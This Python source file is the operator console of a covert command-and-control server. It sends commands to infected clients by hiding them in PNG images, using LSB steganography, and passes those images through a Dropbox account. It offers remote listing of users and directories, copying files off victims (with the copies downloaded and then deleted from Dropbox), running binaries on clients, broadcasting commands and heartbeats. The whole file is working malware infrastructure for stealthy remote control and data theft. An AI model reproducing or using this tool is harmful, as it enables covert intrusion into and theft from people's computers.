import dropbox
import sys
import select
from datetime import datetime
from stegano import lsb
import io
import os

#send heartbeat every 180 seconds
HEARTBEAT_PERIOD = 180
#check client responses 30 seconds
CHECK_PERIOD = 30
#set timeout for clients
TIMEOUT = HEARTBEAT_PERIOD*3
#set timeout for prompt
PROMPT_TIMEOUT = 30

tmp_path = None
backup_path = None

def current_datetime():
    return datetime.now().strftime("%d/%m/%Y %H:%M:%S")


def get_last_command_time(message):
    last_command = message.split(';')[-2]
    return datetime.strptime(last_command.split('|')[0], "%d/%m/%Y %H:%M:%S")


def init(access_token):
    access_token = sys.argv[1]
    dbx = dropbox.Dropbox(access_token)

    if len(dbx.files_list_folder('').entries) == 0:
        dbx.files_create_folder('/art')

    return dbx


def print_prompt(selected_client):
    if selected_client == -3:
        print("\nSelected client broadcast")
    else:
        print("\nSelected client " + str(selected_client))
    print("Type 1-7 to select a feature")
    print("1 - list of users currently logged in")
    print("2 dir_path - list content of specified directory")
    print("3 - id of current user")
    print("4 file_path - copy a file in specified path")
    print("5 bin_path - execute a binary from specified path")
    print("6 - select client")
    print("7 - exit and save communication")


def handle_client_selection(clients):
    print("\nSelect client name for sending commands")
    for i, client in enumerate(clients + ['broadcast']):
        print(str(i) + " " + client)
    print("Type 0-" + str(len(clients)) + " to select a client")

    i, o, e = select.select([sys.stdin], [], [], PROMPT_TIMEOUT)
    if i:
        input_string = sys.stdin.readline()
        words = input_string.strip().split()
        if len(words) != 1 or int(words[0]) < 0 or int(words[0]) > len(clients):
            print("Error - Invalid Client")
        elif int(words[0]) == len(clients):
            return -3
        else:
            return int(words[0])
    else:
        print("Timing out input to perform logic, wait for prompt...")
        print("")

    return -2    


def get_alive_clients(dbx, timedout_clients):
    #get list of client names that haven't timed out
    ret = []
    for entry in dbx.files_list_folder('/art').entries:
        if entry.name in timedout_clients or entry.name.startswith('TMP_'):
            continue
        ret.append(entry.name)
    return ret


def handle_command_selection(dbx, timedout_clients, selected_client):
    print_prompt(selected_client)
    i, o, e = select.select([sys.stdin], [], [], PROMPT_TIMEOUT)

    clients = get_alive_clients(dbx, timedout_clients)
    commands = ['who', 'ls', 'id', 'cp', 'execute']
    if i:
        input_string = sys.stdin.readline()
        words = input_string.strip().split()
        if selected_client == -1 and words[0] not in ['6', '7']:
            print("Error - Select a client first")
        elif len(words) > 2 or len(words) < 1 or words[0] not in ['1','2','3','4', '5', '6', '7']:
            print("Error - Invalid command")
        elif words[0] in ['2','4', '5'] and len(words) != 2:
            print("Error - Invalid command missing argument")
        elif len(words) == 2 and words[0] not in ['2','4','5','6']:
            print("Error - Invalid command")
        elif words[0] == '6':
            return handle_client_selection(clients)
        elif words[0] == '7':
            return -1
        elif words[0] in ['2','4', '5']:
            if selected_client == -3:
                broadcast_command(dbx, commands[int(words[0]) - 1] + ' ' + words[1], clients)
            else:
                execute_command(dbx, commands[int(words[0]) - 1] + ' ' + words[1], clients[selected_client])
        else: 
            if selected_client == -3:
                broadcast_command(dbx, commands[int(words[0]) - 1], clients)
            else:
                execute_command(dbx, commands[int(words[0]) - 1], clients[selected_client])
        print("")
    else:
        print("Timing out input to perform logic, wait for prompt...")
        print("")

    return -2


def broadcast_command(dbx, command, clients):
    for client in clients:
        execute_command(dbx, command, client)


def execute_command(dbx, command, client):
    header = current_datetime() + "|REQUEST|" + command + "|;"
    print('Executing ', header)
     
    for entry in dbx.files_list_folder('/art').entries:
        if entry.name == client:
            dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)

    message = lsb.reveal(tmp_path + client, lsb.generators.eratosthenes())
    message += header 
    secret = lsb.hide(tmp_path + client, message,  lsb.generators.eratosthenes())

    buf = io.BytesIO()
    secret.save(buf, format='PNG')
    dbx.files_upload(buf.getvalue(), '/art/' + client, mode=dropbox.files.WriteMode.overwrite)


def process_files(dbx, last_check, clients):
    #for each client
    for entry in dbx.files_list_folder('/art').entries:
        if entry.name in timedout_clients or entry.name.startswith('TMP_'):
            continue

        #download image with secret message 
        dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)
        message = lsb.reveal(tmp_path + entry.name, lsb.generators.eratosthenes())

        last_time = get_last_command_time(message)

        if last_check >= last_time:
            continue
        
        #iterate over commands
        for line in message.split(';')[:-1]:
            fields = line.split('|')
            response_time = datetime.strptime(fields[0], "%d/%m/%Y %H:%M:%S")   
            #check if read command is a new response          
            if last_check < response_time and fields[1] == 'RESPONSE':
                if fields[2] in ['heartbeat', 'register']:
                    continue

                #save response content to command line
                print(fields[3])
                if fields[2].split(' ')[0] == 'cp':
                    file_name = fields[3].split('\n')[1]
                    #save copied image to backup directory
                    if file_name != 'cp error - no such file':
                        dbx.files_download_to_file(backup_path + file_name, '/art/' + file_name)
                        dbx.files_delete('/art/' + file_name)

      
def backup_communication(message, client):
    #save client communication to backup directory
    lines = message.split(';')
    f = open(backup_path + client[:-4] + '.txt', "w")
    f.write(';\n\n'.join(lines))
    f.close()


def cleanup(dbx, client):
    #delete file in tmp directory and in dropbox
    dbx.files_delete('/art/' + client)
    os.remove(tmp_path + client)


def update_timedout_clients(dbx, timedout_clients):
    #check if clients timed out
    for entry in dbx.files_list_folder('/art').entries:
        if entry.name in timedout_clients or entry.name.startswith('TMP_'):
            continue
        dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)

        message = lsb.reveal(tmp_path + entry.name, lsb.generators.eratosthenes())

        last_time = get_last_command_time(message)
        diff = datetime.now() - last_time 
        if diff.seconds > TIMEOUT:
            #register client as timed out
            timedout_clients.append(entry.name)
            backup_communication(message, entry.name)
            cleanup(dbx, entry.name)

    return timedout_clients


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Error - Invalid Call")
        print("Usage: python3", sys.argv[0], "APP_ACCESS_TOKEN TMP_DIR_PATH BACKUP_DIR_PATH")
    else:
        #create dirs if they don't exist
        tmp_path = sys.argv[2]
        backup_path = sys.argv[3]
        for path in [tmp_path, backup_path]:
            if not os.path.exists(path):
                os.makedirs(path)

        #get dropbox object
        dbx = init(sys.argv[1])

        #create words list if there isn't one
        no_words = True
        for entry in dbx.files_list_folder('').entries:
            if entry.name == 'words.txt':
                no_words = False
        
        if(no_words):
            f = open('./resources/words.txt', "rb")
            dbx.files_upload(io.BytesIO(f.read()).getvalue(), '/words.txt')
            f.close()

        #check which clients have timed out
        timedout_clients = update_timedout_clients(dbx, [])

        last_heartbeat = datetime.now()
        last_check = datetime.now()

        selected_client = -1

        #main loop
        while True:
            #check dropbox files for responses from clients
            check_diff = datetime.now() - last_check
            if check_diff.seconds > CHECK_PERIOD: 
                tmp = datetime.now()
                process_files(dbx, last_check, timedout_clients)
                update_timedout_clients(dbx, timedout_clients)
                last_check = tmp
                selected_client = -1

            #send heartbeat to clients
            heartbeat_diff = datetime.now() - last_heartbeat
            if heartbeat_diff.seconds > HEARTBEAT_PERIOD:
                tmp = datetime.now()
                broadcast_command(dbx, 'heartbeat', get_alive_clients(dbx, timedout_clients))
                last_heartbeat = tmp

            #read command from UI and execute it
            res = handle_command_selection(dbx, timedout_clients, selected_client) 
            if res == -1:
                #backup client communication on server exit
                clients = get_alive_clients(dbx, timedout_clients)
                for client in clients:
                    dbx.files_download_to_file(tmp_path + client, '/art/' + client)
                    message = lsb.reveal(tmp_path + client, lsb.generators.eratosthenes())

                    backup_communication(message, client)
                    cleanup(dbx, client)
                break
            elif res >= 0 or res == -3:
                #set selected client
                selected_client = res
